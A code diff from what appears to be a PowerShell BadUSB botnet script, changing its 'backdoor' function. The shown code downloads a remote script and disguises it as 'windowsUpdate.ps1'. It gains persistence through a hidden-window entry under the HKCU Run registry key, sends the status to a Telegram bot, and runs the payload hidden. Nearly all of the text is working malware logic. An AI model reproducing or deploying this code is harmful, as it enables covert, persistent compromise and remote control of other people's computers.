@@ -29,12 +29,11 @@ $githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/mas
 
 function backdoor {
         Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
-        $text = "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
-        Add-Content "C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windowsUpdate.ps1" $text
+		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
         # Check backdoor
         $checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
         Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
-        ##Copy-Item "C:\Users\$env:username\Documents\windowsUpdate.ps1" -Destination "C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windowsUpdate.ps1"
+		
         $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
         Invoke-Expression -Command:$command
 
